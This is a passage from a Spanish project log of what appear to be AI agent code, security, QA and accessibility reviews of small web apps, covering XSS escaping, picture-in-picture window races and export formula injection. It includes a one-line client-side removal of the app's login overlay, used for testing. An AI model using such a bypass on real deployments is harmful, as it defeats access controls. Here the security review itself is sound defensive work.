clave faltante no desalinea ni corrompe datos de otras filas, solo deja esa celda en blanco; útil saberlo antes de asumir que una clave faltante en un objeto de exportación es automáticamente un bug de datos. Tercer hallazgo, discrepancia de proceso: la nota de versión de este commit (`release-notes/2026-08-03-mentor-checkbox-y-sobre-el-mentee.md`) está fechada 4 días antes de la fecha real del commit (`git log` confirma `2026-08-07`) — el contenido es preciso, solo la fecha del archivo está mal. Cruce con `security-reviewer` (mismo commit, mismo día, revisión concurrente en el mismo worktree, también APROBADO CON OBSERVACIONES): confirmo con ejecución real su análisis estático de que `esc()` escapa correctamente y que el `!important` no toca `disabled`/foco; sin hallazgos de seguridad nuevos de mi parte. Detalle completo en `docs/bitacora-mentor/qa-checklist.md` ("2026-08-07") y casos borde 26-28 en `docs/bitacora-mentor/requerimientos.md`.

- **2026-08-07 (security-reviewer, commit `9bf2e86`, rama `claude/mentor-checkbox-y-sobre-el-mentee`, solo `bitacora-mentor.html`, sin archivos compartidos): APROBADO CON OBSERVACIONES.** El campo nuevo `about` ("Sobre el mentee") sigue el mismo patrón de escapado ya usado para `goal`/`progress` (`expandableField()` línea 774, `v('about')` línea 1797 en el `<textarea>` del modal) — sin gap de XSS, y sin necesidad de re-ejecutar `esc()` porque este commit no la toca (sigue con el fix de comillas del `d73cec7` del 2026-07-29, ya verificado con ejecución real ese día). Su ausencia en mentees ya guardados no produce `"undefined"` visible, y un valor manipulado a un tipo no-string (vía folder bridge o `importBackup()` sin validar contenido, gap ya conocido) no rompe nada gracias a la coacción segura de `textContent`. El `!important` del CSS de checkboxes (`bitacora-mentor.html:392-401`) no toca `outline`/`disabled` — el bloqueo de interacción de un checkbox de solo lectura es garantía de la plataforma HTML, no del CSS que este commit cambia. **Único hallazgo con algo de sustancia, ya conocido, no nuevo en su categoría:** `buildExportRows()`/`exportCSV()`/`exportExcel()` (`bitacora-mentor.html:2255-2345`) siguen sin neutralizar valores que empiecen por `=`/`+`/`-`/`@` en ningún campo de texto libre (inyección de fórmulas de Excel/Sheets) — riesgo ya aceptado como no bloqueante desde el 2026-07-29 con `s.approach`; `about` se suma a la lista de campos afectados (junto con `Nombre`, `Objetivo`, `Tema`, `Compromiso`, etc.), no la crea. Recomendado corregirlo de una vez para todos los campos si se decide cerrarlo, priorizando `exportCSV()` por ser el formato con mayor riesgo real. Detalle completo en `docs/security-notes.md` ("Revisión 2026-08-07") y casos borde 23-25 en `docs/bitacora-mentor/requerimientos.md`. **Límite declarado:** sin `node`/`python3`/navegador en esta sesión — toda la verificación es estática, salvo donde se apoya en ejecución real ya hecha en revisiones anteriores sobre código que este commit no modifica.

- **2026-08-04 (qa-lead, rama `hourglass-pip-icono-nativo-no-bloquea`, fix del caso 45): APROBADO, con ejecución real que confirma y detalla la incertidumbre que el propio tech lead dejó explícita en su encargo.** Reproduje el fix completo (mock de `documentPictureInPicture` + `iframe`, `pagehide` disparado directo sobre la ventana simulada, sirviendo el worktree en `http://localhost:8792/`): confirmado que tras un cierre nativo simulado `pipCerradaAMano` se queda en `false`, un `visibilitychange` sin gesto sigue sin reabrir nada, y el siguiente `pointerdown`/`keydown` cualquiera sí reabre sola sin necesitar cronómetro nuevo — coincide con lo reportado. **Las dos "costuras" que el tech lead pidió investigar SÍ ocurren, con datos reales, no son hipotéticas — pero ninguna es bloqueante porque ambas se autolimpian solas:** (a) si el último cronómetro se detiene mientras `gestoArmado` sigue `true` (armado tras un cierre nativo, sin que medie gesto), la bandera queda huérfana con dos listeners colgando de `document` hasta el próximo `pointerdown`/`keydown` cualquiera en la página, momento en el que se resetea sin abrir nada (0 cronómetros activos); (b) si el `pagehide` de una ventana que se está cerrando llega mientras OTRA apertura ya está en vuelo (`abriendoPip=true`, disparada por `ajustarVentanaSegunVista()`/`visibilitychange` en el hueco entre que el navegador marca `.closed=true` sincrónicamente y el evento `pagehide` llega como tarea aparte), el manejador de `pagehide` SÍ rearma `armarAperturaEnPrimerGesto()` de más — el resultado final es siempre correcto (una sola ventana activa, nunca duplicada, 0 errores de consola en 3 repeticiones, reproducido también con un `visibilitychange` real, no solo llamando la función interna), pero deja el mismo tipo de listener huérfano de (a). **Relevante para el resto del equipo, en especial `security-reviewer`:** el veredicto de `security-reviewer` sobre este mismo diff (caso 46 de `docs/hourglass/requerimientos.md`) concluyó "no hay interferencia" con las carreras 34/35 basándose solo en lectura de código — eso es cierto para el *resultado final*, y lo reconfirmo, pero no cubre este camino intermedio con estado transitorio real que solo apareció al ejecutar el código, no al leerlo. Ninguno de los dos hallazgos es bloqueante ni tiene efecto visible para la usuaria. Detalle completo, con las cifras de `pipRequests`/`gestoArmado`/`pipActivo` de cada prueba, en `docs/hourglass/qa-checklist.md` y caso borde 47 de `docs/hourglass/requerimientos.md`. Ninguna app compartida fue tocada por este diff (`git diff origin/master --stat` confirma solo `hourglass.html` con cambios de código) — no aplica reverificación cruzada de login.

- **2026-08-04 (security-reviewer, rama `hourglass-pip-icono-nativo-no-bloquea`, fix del caso 45): APROBADO.** Revisé el diff acotado a dos funciones (`hourglass.html`, manejador de `pagehide` en `abrirVentanaFlotante()` y `armarAperturaEnPrimerGesto()`) que hace que el ícono nativo de "volver a la pestaña" ya no marque `pipCerradaAMano=true`. Confirmado con lectura línea por línea (sin herramienta de navegador con gesto real disponible, mismo límite de siempre en esta app): (a) la bandera nueva `gestoArmado` no puede acumular listeners `pointerdown`/`keydown` — se fija de forma síncrona antes de registrar, y el propio disparo la limpia como primera instrucción, así que hay como máximo 2 listeners colgados de `document` en cualquier momento, nunca más; (b) no abre una vía nueva de spam de `requestWindow()` — cada apertura sigue exigiendo activación transitoria real del navegador, y el único guard que falta (`event.isTrusted` en el manejador de `pagehide`) es preexistente, no introducido por este diff, y solo importaría bajo un escenario de XSS hoy fuera de alcance (proyecto sin contenido de terceros); (c) el guard `abriendoPip` no se tocó y sigue siendo efectivo, y el orden `pipWin=null` → `render()` dentro del handler evita pintar sobre la ventana recién cerrada — las carreras 34/35/37/38/41 ya cerradas siguen cerradas. Sin secretos, sin XSS, sin dependencias nuevas en el diff. Caso borde nuevo, no bloqueante, documentado en `docs/hourglass/requerimientos.md` (caso 46): el manejador de `pagehide` no distingue eventos confiables de sintéticos — anotado como decisión explícita, descartado para este release por no haber vía de XSS conocida hoy. Detalle completo en `docs/security-notes.md` ("Revisión 2026-08-04 — rama `hourglass-pip-icono-nativo-no-bloquea`").

- **2026-08-02 (tech lead, método de prueba — leer antes de dar por bueno un "fallo" al probar Hourglass o cualquier app tras quitar el candado a mano):** el bypass del candado (`document.getElementById('aiapps-auth-gate').remove()`) **no desconecta el `MutationObserver`** que `auth-gate.js` dejó observando `document.body`. Ese observador vuelve a marcar `inert` **todos** los hijos del `<body>` ante **cualquier** cambio en la lista de hijos del body — no solo al llamar `setAttribute`, que era lo único documentado hasta ahora. Consecuencia práctica: si una prueba agrega un elemento auxiliar como hijo del `<body>` (un `iframe`, por ejemplo), a partir de ahí `focus()` no funciona, los clics no llegan y el `inert` de la propia app parece roto — tres "fallos" seguidos que no existían. **Solución:** anidar los elementos auxiliares dentro de `<main>` (o de cualquier descendiente), no como hijos directos del `<body>`; así el observador no se dispara y el `inert` real de la app se puede medir. Segundo artefacto del mismo día, distinto y también confundible con un bug: **con el panel del navegador oculto, `window.innerWidth`/`innerHeight` valen 0**, así que cualquier lógica que acote a la ventana (aquí `clampFloat()` del panel flotante) pega el elemento a la esquina y parece que el teclado no lo mueve. Antes de reportar algo posicional, comprobar `window.innerWidth` y, si es 0, fijar tamaño con `resize_window`.

- **2026-08-02 (qa-lead, commit `e59d03c` "el cronómetro puede salir a una ventana propia", rama `claude/hourglass-app`): APROBADO CON OBSERVACIONES.** Confirmado con ejecución real (invocación directa de funciones, `dispatchEvent`/`.click()` reales, sustitución de `pipWin` por el `contentWindow` de un `iframe` del mismo origen) todo lo verificable sin activación de usuario genuina: el botón ⧉ solo aparece con la API disponible y al menos un cronómetro activo; lista/pausar/reanudar/detener funcionan desde la ventana aparte y refrescan ambos documentos cada segundo; copia de estilos sin duplicar tras 3 ciclos de abrir/cerrar secuenciales; recordatorio en la página sin duplicar la lista; los 3 controles que el recordatorio no trae (`toggle`/`ir`/`data-act`) están protegidos en `wireFloatPanel()` sin excepción; el panel normal (teclado, Inicio, minimizar, vista Año, gráficos) sin errores de consola; a 375px el recordatorio (más chico que el panel completo) no solapa la barra de pestañas. **Confirmado con un control limpio que `computer{action:"left_click"}` no entrega ningún clic real a la página en esta sesión** (0 de 2 intentos, ni siquiera un `<button>` recién creado sin otros listeners recibió su propio evento), así que ninguna sesión con esta herramienta puede generar el gesto real que exige `requestWindow()` — coincide con lo que ya advertía el encargo, y con `documentPictureInPicture.requestWindow()` invocado sin envoltorio confirmé el mismo `NotAllowedError` real que describe el commit. **Hallazgo que eleva la severidad de un hallazgo de `security-reviewer` sobre el mismo commit, no solo lo repite:** `security-reviewer` (caso borde 34) asumió por lectura de código que un doble clic rápido sobre ⧉ sería rechazado solo por el navegador con `InvalidStateError`, sin consecuencia real. Lo probé con dos promesas de `requestWindow` genuinamente pendientes (no una suposición): el único guard de la app (`if(pipActivo())`) da `false` para ambas llamadas mientras la primera sigue sin resolver, así que **las dos se resuelven**, `pipWin` termina apuntando solo a la segunda, la primera queda huérfana y cerrarla anula la referencia a la segunda aunque siga abierta — un escenario más severo ("ventana huérfana con manejo confuso de cuál se cierra") que "un mensaje de más". No se pudo confirmar contra el `requestWindow()` real de Chrome (mismo límite de activación), así que no queda demostrado que ocurra en producción, pero el código no lo impide por sí solo — no bloqueante (recuperable siempre cerrando la ventana desde el sistema operativo), pero es la discrepancia más importante de esta revisión y se reporta como tal. **Hallazgo nuevo, no reportado por nadie más:** el aviso de "cronómetro olvidado" (`lockBehindModal`) no alcanza la ventana aparte (es otro `document`, fuera de `document.body`) — confirmado que detener el cronómetro desde ahí mientras el aviso sigue abierto en la página deja el aviso con un texto que ya no es cierto, y terminarlo desde el aviso mismo da el mensaje confuso pero inocuo "0 cronómetro(s) detenido(s)...". **Brecha de verificación explícita, no un bug:** el regreso automático del panel al cerrar la ventana aparte depende de que el navegador dispare `pagehide` al llamar `.close()` sobre una ventana real — documentado por la propia API, pero ni esta sesión ni la del commit original lo observaron con una ventana real (el sustituto de `iframe` no lo dispara solo). **Corrección de proceso a mitad de tarea:** el tech lead me pidió inicialmente reverificar el candado de las 5 apps + el hub, y luego corrigió que no aplicaba a este commit específico (`git show --name-only` confirma que solo toca `hourglass.html` y la nota de versión) — alcancé a cargar `index.html` y `bitacora-mentor.html` antes de la corrección y ambas mostraron el candado con 0 errores, coincide con lo esperado, no contradice la corrección. **Aviso de infraestructura para el equipo:** este worktree no tenía servidor local respondiendo en `http://localhost:8791/` ni `node`/`npx`/`python` reales disponibles (los alias de `python`/`python3` de `WindowsApps` solo abren la Microsoft Store) — armé un servidor estático mínimo con `System.Net.HttpListener` de PowerShell (`.claude/static-server.ps1`, sin trackear) apuntado desde `.claude/launch.json`, útil para cualquier agente futuro que se encuentre el mismo entorno sin intérpretes. Detalle completo con las cifras y el código de cada prueba en `docs/hourglass/qa-checklist.md` ("2026-08-02 — revisión del commit `e59d03c`") y casos borde 35-37 en `docs/hourglass/requerimientos.md`.

- **2026-08-02 (security-reviewer, commit `e59d03c`, rama `claude/hourglass-app`): APROBADO CON OBSERVACIONES.** El cronómetro puede salir a una ventana de Picture-in-Picture de documento (`window.documentPictureInPicture.requestWindow()`). Confirmado que `pintarPip()` reutiliza `fpListaHtml()` sin ningún gap de escapado nuevo (todo el texto de usuario sigue pasando por `esc()`, igual que en el panel dentro de la página); la copia de `document.styleSheets` a la ventana nueva no arrastra nada explotable hoy porque el archivo no carga hojas externas ni tiene `<style>` con datos de usuario (nota para el futuro si algún día se agrega una hoja externa); y el ciclo de vida de `pipWin` no deja al latido de 1 s escribiendo sobre un documento cerrado (`.closed` se fija de forma síncrona, `pipActivo()` lo revisa en cada tick). Reverificadas sin regresión las 4 protecciones de la ronda anterior: `esc()` con los 5 caracteres, `hourglass_float_panel` aislado por usuario (`scopedKey`), el arranque ya no guarda sin `cachedUserId`, y un bloque fijo tampoco puede cambiar de fecha (fix del commit `14a6628`, previo a este). Dos hallazgos nuevos de severidad baja, no bloqueantes: (1) el botón "Ventana aparte" no se deshabilita durante el `await` de `requestWindow()`, permitiendo una doble solicitud rápida (ya mitigada por el `catch` de `InvalidStateError` existente, sin corrupción de datos); (2) cualquier error que no sea `InvalidStateError` se etiqueta como si fuera de permisos, mensaje impreciso pero sin fuga de información. Detalle completo en `docs/security-notes.md` ("Revisión 2026-08-02 — commit `e59d03c`") y caso borde 34 en `docs/hourglass/requerimientos.md`.

- **2026-08-02 (business-analyst, documentación actualizada de `hourglass.html` tras el paquete CR-01 a CR-04, commit `3c6fa0a`):** actualicé `docs/hourglass/requerimientos.md` (Propósito, los 56 requerimientos funcionales renumerados y el diagrama de flujo) y reescribí `docs/hourglass/entrenamiento.md` con las 4 novedades: el panel flotante de cronómetros (CR-01), Sueño/Comidas como registros reales que no compiten por la sobrecarga (CR-02), el Panel ahora gráfico — anillo, dona, barras, tendencia y heatmap — con la tabla de detalle plegada (CR-03), y la vista Año con el matiz de "sobrecarga sostenida" pudiendo coincidir con un mes en amarillo/verde (CR-04). Todo verificado leyendo el código real de `hourglass.html` en `3c6fa0a`, contrastado contra `PRDs and Gestiones de cambio/CR-01_Hourglass_Ajustes.docx` (extraído a texto plano vía PowerShell/zip, ya que el `docx` no es legible directo) y `docs/hourglass/prd-resumen.md`. Confirmé además que la corrección de colisión del panel flotante con la barra de pestañas (casos borde 17/23 de `accessibility-reviewer`/`qa-lead`) ya está aplicada en el código de este commit (`limiteSuperiorFlotante()` en `clampFloat()`), pero **no la reverifiqué con interacción real** — dejo esa entrada (caso 33) explícitamente como "por confirmar en vivo", no como cerrada, porque no me corresponde declarar cerrado un hallazgo de otro rol sin ejecución real. **Sin capturas de pantalla reales otra vez** (`screenshot` volvió a fallar con "the Browser pane is not displayed"; un clic real sobre la pestaña "Cronómetros" no tuvo efecto confirmable en `get_page_text` — mismo patrón ya documentado el 2026-07-30 y el 2026-08-02 por otros agentes con esta misma app), documentado explícitamente en `entrenamiento.md` en vez de inventar capturas. **Hallazgo nuevo, ver también "⚠️ Requiere atención" arriba:** editar la **fecha** de un registro automático de Sueño/Comidas (el campo sí quedó editable, a diferencia del proyecto que ya se bloqueó) puede duplicar las horas de ese bloque en el día destino y dejar el día de origen sin aviso — caso borde 32 en `docs/hourglass/requerimientos.md`. Nota para el tech lead: el bloque CR-01/CR-04 sigue sin PR propio hacia `master` (la app base ya se fusionó por el PR #37, según la entrada de `release-manager` de abajo) — esta actualización de documentación es en sí misma un cambio que corresponde anotar en `release-notes/` cuando se decida el PR de este bloque.

- **2026-08-02 (release-manager, verificación previa al merge del bloque CR-01 de `claude/hourglass-app`, commit `3c6fa0a`):** **APROBADO CON OBSERVACIONES.** Higiene de rama limpia, `build.sh` reconfirmado con 13 archivos (0 filtraciones de `docs/`/`release-notes/`), notas de versión sin colisión de nombre. **Aviso importante de proceso:** el PR #37 ya fusionó a `master` (`f9a4c8e`) la app Hourglass base (hasta `195c205`) — esta verificación es solo sobre el bloque nuevo encima (CR-01 a CR-04 + correcciones), que sigue sin fusionar. **Hallazgo nuevo, no bloqueante, pedido explícitamente por el tech lead:** la generación automática de registros de sueño/comida (CR-02) no cambia el número de filas de `app_data` ni acerca el proyecto al límite de 500 MB del plan gratuito de Supabase (~110-180 KB/año, trivial), pero sí es la primera vez que el hub tiene un mecanismo de crecimiento de datos garantizado por calendario en vez de por uso real de la app — y `save()` sigue reenviando el documento JSON completo en cada guardado (patrón ya existente en las 5 apps, no nuevo), así que ese reenvío se vuelve gradualmente más pesado con los años. Recomendado (no urgente) revisar el tamaño real de esa fila una vez al año vía SQL Editor del dashboard de Supabase. **Netlify cambió de estado: pasó de `200` (exponiendo `docs/`) a `404` en todas las rutas hoy** — parece haberse apagado ya, cerrando la exposición pública que se venía arrastrando. Supabase confirmado activo hoy por `curl` directo y, por primera vez, también por el historial real de GitHub Actions (`gh` disponible esta sesión: 4/4 corridas del keepalive en verde, la más reciente 3 días atrás). Caso borde 31 nuevo en `docs/hourglass/requerimientos.md`. Detalle completo en `docs/release-log.md` y `docs/infra-watch.md`.

- **2026-08-02 (security-reviewer, commits `3ff7445`+`64fc5b6`, rama `claude/hourglass-app`):** **APROBADO CON OBSERVACIONES.** Reemplaza una corrida anterior de `security-reviewer` sobre `3ff7445` que murió por límite de sesión sin veredicto. Confirmado lo que pedía el encargo: escapado completo en el panel flotante (incluidos los `data-id`); `clampFloat()` + tecla Inicio bastan de verdad ante un `hourglass_float_panel` corrupto en `localStorage` (incluso con valores `Infinity`, la aritmética de `Math.min`/`Math.max` no produce `NaN`); los 5 gráficos SVG usan colores de constantes/mapas fijos y escapan sus `aria-label`; `generarFijosPendientes()` está acotado en todos los caminos (el tope de `dayKeysInRange`, 400, se aplica antes que `MAX_DIAS_GENERADOS`, 31, así que nunca se generan más de 62 registros de una sentada aunque `ultimoDiaFijosGenerado` esté manipulado a una fecha absurda); `normalize()` protege la identidad de Sueño/Comidas contra suplantación en la creación (repuestos siempre desde la constante `FIJOS`, cualquier id igual en el JSON se descarta); `auth-gate.js` sano (172 backticks, par; timers/cleanups sin fuga; `guard()`/`applyInert`/`onAuthStateChange` fuera de todos los hunks). **Precisión importante sobre el backtick que sí aparece dentro de un comentario nuevo (`auth-gate.js:287`):** a diferencia del incidente del 2026-07-30 (backtick dentro de un comentario CSS, es decir dentro del *contenido literal* del template string), este vive dentro de un `${(() => {...})()}` — código JS real que el parser procesa como código, no como texto de la cadena — un `/* ... */` ahí se cierra por `*/` sin que el backtick importe. **Dos hallazgos nuevos, no bloqueantes, no encontrados por los otros agentes:** (1) el arranque llama a `save()` sin comprobar sesión confirmada (`hourglass.html:2810`) — con `state` vacío (sin sesión), `generarFijosPendientes()` igual crea 2 registros "auto" de Sueño/Comida por defecto y `save()` los escribe en la clave `hourglass_v1` **sin aislar por usuario** (sin fuga entre cuentas, `syncToCloud()` sí corta antes de la nube, pero es una desviación real del principio "nunca guardar antes de confirmar sesión" que costó una ronda completa de hallazgos a las otras 4 apps del hub, y la clave sí queda expuesta al puente de carpeta local por `isSyncKey()`); (2) la protección de identidad de Sueño/Comidas es sólida al crearse pero no al editarse — `projectOptions(..., {incluirSistema:true})` en el formulario de "Editar registro" (`hourglass.html:1940`) permite, con clics normales de la UI, reasignar un registro automático a cualquier proyecto normal, rompiendo en silencio su exclusión del cálculo de sobrecarga sin que `saveManualEntry()` lo valide. **Nota de proceso, relevante para todo el equipo:** el worktree tenía cambios sin commitear por encima de `64fc5b6` a mitad de esta revisión (otra sesión aplicando en vivo 2 de los hallazgos de `qa-lead`/`accessibility-reviewer` sobre este mismo commit: `floatPrefKey()` con `scopedKey`, y un límite superior para que el panel no invada `header`+`nav`) — mismo patrón de edición concurrente ya documentado varias veces en este archivo. El veredicto es específicamente sobre `64fc5b6`, citado contra `git show 64fc5b6:hourglass.html`, no contra el working tree en evolución; los cambios sin commitear que vi de pasada no cubren mis 2 hallazgos nuevos. Sin secretos en el diff ni en el historial completo de ambos archivos (JWT scan y grep de `service_role`/claves privadas, 0 resultados). Detalle completo con evidencia línea por línea en `docs/security-notes.md` ("Revisión 2026-08-02 — commits `3ff7445` y `64fc5b6`") y casos borde 27-29 en `docs/hourglass/requerimientos.md`.

- **2026-08-03 (security-reviewer, PR #40, commit `8801b2f`, rama `claude/hourglass-app`): APROBADO CON OBSERVACIONES.** La ventana flotante de cronómetros ahora se abre y cierra sola según la vista/visibilidad (`state.settings.autoVentanaFlotante`, default `true`). Confirmado sin regresión: escapado completo (el único HTML nuevo interpola un booleano ya forzado por `!!` y texto literal), `hourglass_float_panel` sigue aislado por usuario, el guard de "no guardar sin sesión confirmada" sigue intacto, un bloque fijo sigue sin poder cambiar de proyecto/fecha. El listener de "primer gesto" (`armarAperturaEnPrimerGesto`, `hourglass.html:2773-2784`) se arma una sola vez por carga (único punto de llamada: `hourglass.html:3165`), se autolimpia tras dispararse (quita `pointerdown` y `keydown` a la vez) y no interfiere con nada porque nunca llama `preventDefault`/`stopPropagation`. La guarda `abriendoPip` siempre se libera en un `finally` — no hay forma de que el botón ⧉ quede deshabilitado para siempre, ni tormenta de reintentos al entrar/salir rápido de la vista de Cronómetros (`abrirVentanaSiCorresponde()` corta de inmediato si ya hay una petición en vuelo). **Hallazgo nuevo, no bloqueante, deducido por lectura de código (no verificado con gesto real — mismo límite de esta app en revisiones anteriores):** el chequeo de "¿estoy viendo Cronómetros?" que decide si corresponde abrir la ventana solo se evalúa **antes** del `await requestWindow()`, no después. Si el primer gesto tras recargar la página (con cronómetros ya corriendo) es un clic directo sobre la pestaña "Cronómetros", el `pointerdown` de ese mismo clic dispara la apertura automática (leyendo `ui.view` todavía en su valor por defecto `'panel'`) **antes** de que el `click` posterior cambie la vista — cuando la promesa de `requestWindow()` resuelve, la usuaria ya está mirando la lista de Cronómetros, pero la ventana se abre igual encima de ella, violando la regla de diseño explícita ("mirando Cronómetros, nada flotando"). Se autocorrige en el siguiente cambio de vista, no es un bucle, no expone datos nuevos ni causa pérdida de datos — es un defecto de sincronización de estado tras una espera asíncrona, severidad baja. Detalle completo con la secuencia línea por línea en `docs/security-notes.md` ("Revisión 2026-08-03 — PR #40") y caso borde 37 en `docs/hourglass/requerimientos.md` (caso 38 para una inconsistencia de tipo menor y no explotable en la coerción de `autoVentanaFlotante`, sin severidad de seguridad).

- **2026-08-02 (qa-lead, commit `64fc5b6` "Hourglass: correcciones de accesibilidad de la revision del CR", sobre `3ff7445` CR-01 a CR-04):** **APROBADO CON OBSERVACIONES.** Reemplaza una corrida anterior de `qa-lead` sobre `3ff7445` que murió por límite de sesión sin veredicto — este es el primer go/no-go de calidad real sobre este bloque. Todo verificado con ejecución real (funciones invocadas en vivo con datos inyectados, clics/`dispatchEvent` reales sobre DOM ya renderizado, `getBoundingClientRect`/`elementFromPoint`/`performance.now()` reales), en esta sesión `javascript_exec` funcionó de forma consistente (a diferencia de sesiones anteriores de este mismo archivo), aunque `screenshot` siguió sin componer frames en ningún momento. **Confirmado, sin regresión:** las 5 apps + el hub siguen con el candado de `auth-gate.js` funcionando (0 errores de consola en las 7 páginas); CR-02 no genera doble contabilidad en ningún camino probado (overload, donut, barras, filtros de Registros, vista Año); el fix de rendimiento de la vista Año escala linealmente (1095 registros ≈130ms, 5110 registros ≈525ms, sin crecimiento entre repeticiones); el tope de 62 filas de "Día por día" (caso borde 21, pendiente para qa-lead) y el fix de contraste del heatmap (caso borde 20) están implementados y confirmados en el DOM real, no solo en el CSS fuente; el aviso de "Detener y guardar" sin nada que guardar (fix del 2026-07-30) sigue intacto con un clic real. **Hallazgo que eleva un caso ya anotado por `accessibility-reviewer` de "determinista por código" a "reproducido con clic bloqueado medido":** a 375px, arrastrando el panel flotante con el teclado (`Shift+ArrowUp` real) hasta la zona superior, queda con 13.330px² de solape sobre `<nav class="tabs">` y `document.elementFromPoint()` en el centro de esa barra devuelve un nodo del panel, no la pestaña — un toque real ahí en un teléfono no llegaría al control de abajo. El commit revisado solo agregó una tecla `Home` para recuperar el panel, no evitó la colisión que `accessibility-reviewer` ya había señalado (caso borde 17). No bloqueante (nada queda inalcanzable por teclado). **Aviso de método para el equipo:** el script de bypass de candado dado en el encargo sobreescribe `Element.prototype.setAttribute` para bloquear `inert` — hay que restaurarlo (con un `setAttribute` nativo tomado de un `<iframe>` desechable) antes de poder probar el `inert` propio de la app, y **cualquier mutación de `document.body.children` mientras tanto (ej. crear/quitar un elemento auxiliar) reactiva el `MutationObserver` del candado original** (que queda colgado si no se llama a su función real de limpieza) y re-aplica `inert` a todo el body, incluido el host del propio modal — confundible con un bug de la app si no se sabe que es un artefacto del método de bypass. Detalle completo, con las cifras de las 4 mediciones de rendimiento y el resto de la regresión (solape, medianoche, pausas, `MAX_ENTRY_DAYS`), en `docs/hourglass/qa-checklist.md` y casos borde 21 (cerrado)/22-26 (nuevos) en `docs/hourglass/requerimientos.md`.

- **2026-08-02 (accessibility-reviewer, commit `3ff7445` "Hourglass CR-01 a CR-04: panel flotante, bloques fijos reales, dashboard gráfico y vista Año"):** **APROBADO CON OBSERVACIONES**, sin bloqueantes. Lo nuevo (panel flotante de cronómetros arrastrable, 5 gráficos SVG, colores nuevos, extensión de la escena de login `hourglass-time`) está bien resuelto en su mayoría: el asa del panel (`role="button" tabindex="0"`) se mueve con las 4 flechas (Shift acelera), no atrapa el foco, `aria-expanded` del botón de minimizar es correcto, y convive sin cambios con el candado de login y con el modal preexistente de "cronómetro olvidado" (`lockBehindModal()` ya itera **todos** los hijos de `<body>`, así que el nuevo `#float-host` queda `inert` automáticamente sin tocar ese código). `prefers-reduced-motion` extendido correctamente para el punto que late del panel y para las piezas nuevas de la escena de login (saltos del gato, parpadeo de los dos puntos digitales) — verificado por lectura completa de cada regla CSS y cada gate de JS, **no con `getComputedStyle` en vivo** (sin herramienta de JS disponible esta sesión). **4 hallazgos concretos, ninguno bloqueante:** (1) el heatmap de carga tiene un fallo de contraste real (`#9AA29B` sobre `#F1F3F0` ≈2,35:1, muy bajo AA) en el número de día de celdas sin registrar — nota: el encargo asumía el par `#16212B`/`#F1F3F0`, que en el código real no existe para esa celda; (2) el gráfico de "Tendencia semana a semana" codifica el estado de cada semana solo por color, sin ningún texto que lo repita, específicamente en la vista Año (donde la tabla diaria que sí serviría de respaldo se apaga a propósito); (3) el panel flotante se puede arrastrar (mouse o teclado) encima de la barra de pestañas u otro control, sin ninguna lógica de colisión, y la posición persiste en `localStorage` entre sesiones — no atrapa el teclado, pero puede tapar visualmente un control enfocado (WCAG 2.4.7); (4) el panel queda al final del orden de Tab de toda la página (su nodo vive al final del `<body>`), aunque es visible sobre cualquier pestaña. **Aviso de herramienta para el resto del equipo:** en esta sesión `computer{action:"screenshot"}` funcionó **una sola vez** al principio (confirmó el candado con foco automático en "Correo") y dejó de componer frames después — mismo patrón que ya vivió `accessibility-reviewer` el 2026-07-30 con esta misma app — y **no hubo ninguna herramienta de evaluación de JS disponible** (no hay `navigate` a `javascript:`, ni consola/`exec`), a diferencia de lo que el encargo describía haber usado en otra sesión. Reconfirmado también que `get_page_text`/`read_page` no reflejan el candado de login (devuelven el contenido de la app como si no hubiera overlay, con el candado visualmente en pantalla). Detalle completo, con la tabla de 12 pares de contraste calculados con la fórmula real WCAG, en `docs/hourglass/accessibility-notes.md` (sección "2026-08-02") y casos borde 17-21 en `docs/hourglass/requerimientos.md`.



- **2026-07-30 (business-analyst, documentación de `hourglass.html`, rama `claude/hourglass-app`):** agregué a `docs/hourglass/requerimientos.md` el Propósito, los 39 requerimientos funcionales y el diagrama de flujo (derivados de leer el código completo, no del PRD), y creé `docs/hourglass/entrenamiento.md` (guía paso a paso para la usuaria no técnica). **Sin capturas de pantalla reales en esta sesión**: `screenshot`/`zoom` fallaron siempre con "the Browser pane is not displayed, so the page is not compositing frames", y una prueba de control (clic sobre un `<a href>` sin JS, el enlace "← Volver al hub") tampoco navegó — mismo resultado exacto que ya había reportado `accessibility-reviewer` ese mismo día con la misma prueba, así que es la herramienta, no la app; queda anotado explícitamente en `entrenamiento.md` en vez de inventar o describir capturas. **Aviso de proceso para el equipo:** un `navigate` a mitad de tarea me llevó por error a una pestaña (`tab-7`) con una **sesión real ya autenticada en producción** (`https://lips-hub.lissette2402.workers.dev`, con el widget de Cuenta visible) — no hice clic en nada ahí, abrí una pestaña nueva (`tab-8`) y confirmé el origen con `tabs_context` antes de seguir. Mismo patrón de riesgo ya documentado el 2026-07-23 (pestañas de otras sesiones compartiendo el mismo navegador). **Tres casos borde nuevos agregados** (14-16) en `docs/hourglass/requerimientos.md`: el más importante es el 14 — "Detener y guardar" un cronómetro puede terminar en 0 minutos activos (toda la duración quedó dentro de sus propias pausas) y en ese caso `stopTracker()` no guarda ningún registro, pero el mensaje que ve la usuaria dice igual "Cronómetro detenido y guardado como registro" — es pérdida de datos silenciosa con un mensaje que afirma lo contrario, y el propio archivo ya resuelve bien el mismo caso (0 minutos) en el formulario manual, así que es una inconsistencia real, no una limitación técnica. Ver línea en "⚠️ Requiere atención" abajo. Los otros dos (15: aproximación de un solo paso en `fromZoned()` puede fallar en la hora exacta de un cambio de horario si se elige una zona con DST; 16: archivar un proyecto no detiene ni avisa sobre sus cronómetros en curso) son de bajo riesgo, documentados para que quede como decisión explícita.

- **2026-07-30 (release-manager, verificación previa al merge de `claude/hourglass-app`, commit `df5acc8`):** **APROBADO CON OBSERVACIONES.** Higiene de rama limpia (sin archivos sueltos; 2 commits detrás de `origin/master` por un cambio de solo `CLAUDE.md`, confirmado con `git merge-tree` que fusiona sin conflicto). Nota de versión presente y correcta (`release-notes/2026-07-30-hourglass-app.md`). Sin migración de Supabase (agregar `"hourglass"` a `VALID_APP_IDS` es validación de cliente, no esquema/RLS). Corrí `build.sh` yo mismo (no di por bueno lo que dijo `qa-lead`): `dist/` queda con 13 archivos, incluye `hourglass.html` y `assets/cheshire.png`, 0 archivos de `docs/`/`release-notes/` filtrados. Confirmado que `_headers` no restringe `img-src`, así que la imagen nueva no necesita ajuste de CSP. Supabase confirmado ACTIVO hoy con `curl` directo (`200`, cuerpo `[]`) — no por el workflow de GitHub Actions (sin `gh` disponible esta sesión). Producción actual (Cloudflare Workers) verificada viva y sin errores, sin cambios porque esta rama todavía no está fusionada. **Hallazgo real, no bloqueante, para el resto del equipo: este repo no tiene ningún mecanismo de deploy preview por PR desde que se movió a Cloudflare Workers** — no hay forma de abrir un preview real de una rama antes de fusionar, a diferencia de cuando Netlify generaba uno por PR. Toda verificación previa al merge queda limitada a revisión de código + 